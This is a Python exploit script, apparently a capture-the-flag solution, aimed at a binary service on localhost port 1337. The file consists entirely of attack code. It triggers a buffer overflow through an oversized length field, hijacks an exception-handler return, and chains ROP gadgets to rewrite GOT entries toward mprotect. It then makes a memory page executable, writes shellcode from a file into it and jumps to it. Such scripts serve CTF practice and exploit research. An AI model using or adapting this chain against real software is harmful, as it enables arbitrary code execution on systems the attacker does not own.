#!/usr/bin/python

import socket
import struct

RWX = 7
INT_MAX = 0x7fffffff

READ_PLT = 0x400d80
LIBC_START_MAIN_PLT = 0x400d90
CXA_ATEXIT_PLT = 0x400da0
ERRNO_LOCATION_PLT = 0x400e00

EXCEPTION_HANDLER_RET = 0x400f00

JMP_RAX = 0x401097
MOVSXD_RDX_EAX = 0x401150
MOV_RAX_RBX = 0x401219
POP_RBX = 0x401355
ADD_DEREF_RAX_EDX = 0x4013db
POP_RDI = 0x4040f3
POP_RSI = 0x404278

READ_GOT = 0x605270
LIBC_START_MAIN_GOT = 0x605278
CXA_ATEXIT_GOT = 0x605280
ERRNO_LOCATION_GOT = 0x6052b0
SHELLCODE_ADDR = 0x605340

LIBC_START_MAIN = 0x21ab0
ERRNO_LOCATION = 0x21f20
CXA_ATEXIT = 0x43430
READ = 0x110070
MPROTECT = 0x11bae0

MOV_DEREF_RAX_RDX = 0x301a4
POP_RAX = 0x439c8
POP_RDX = 0x11c65c

s = socket.create_connection(('localhost', 1337))
f = s.makefile('rw', bufsize=0)

def set_rax(value):
    payload  = struct.pack('<Q', POP_RBX)
    payload += struct.pack('<Q', value)
    payload += 'A' * 8
    payload += struct.pack('<Q', MOV_RAX_RBX)
    payload += 'A' * 32
    return payload

def set_rdx(value):
    payload  = set_rax(value)
    payload += struct.pack('<Q', POP_RBX)
    payload += struct.pack('<Q', value)
    payload += 'A' * 8
    payload += struct.pack('<Q', MOVSXD_RDX_EAX)
    payload += 'A' * 40
    return payload

def deref_add(addr, value):
    payload  = set_rdx(value)
    payload += set_rax(addr + 0x1ba49f1)
    payload += struct.pack('<Q', ADD_DEREF_RAX_EDX)
    payload += 'A' * 8
    return payload

def write64(addr, value):
    payload  = struct.pack('<Q', LIBC_START_MAIN_PLT)
    payload += struct.pack('<Q', addr)
    payload += struct.pack('<Q', CXA_ATEXIT_PLT)
    payload += value
    payload += 'A' * 8
    payload += struct.pack('<Q', ERRNO_LOCATION_PLT)
    return payload

shellcode = open('shellcode.bin', 'rb').read()

f.write(struct.pack('<I', INT_MAX))

payload  = 'A' * 1056
payload += struct.pack('<Q', EXCEPTION_HANDLER_RET)
payload += 'A' * 24

payload += deref_add(READ_GOT, MPROTECT - READ)
payload += deref_add(LIBC_START_MAIN_GOT, POP_RAX - LIBC_START_MAIN)
payload += deref_add(CXA_ATEXIT_GOT, POP_RDX - CXA_ATEXIT)
payload += deref_add(ERRNO_LOCATION_GOT, MOV_DEREF_RAX_RDX - ERRNO_LOCATION)

payload += struct.pack('<Q', POP_RDI)
payload += struct.pack('<Q', SHELLCODE_ADDR & 0xfffff000)
payload += struct.pack('<Q', POP_RSI)
payload += struct.pack('<Q', 0x1000)
payload += struct.pack('<Q', CXA_ATEXIT_PLT)
payload += struct.pack('<Q', RWX)
payload += 'A' * 8
payload += struct.pack('<Q', READ_PLT)

for i  in xrange(0, len(shellcode), 8):
    payload += write64(SHELLCODE_ADDR + i, shellcode[i:i+8])

payload += struct.pack('<Q', LIBC_START_MAIN_PLT)
payload += struct.pack('<Q', SHELLCODE_ADDR)
payload += struct.pack('<Q', JMP_RAX)

f.write(payload)
s.close()
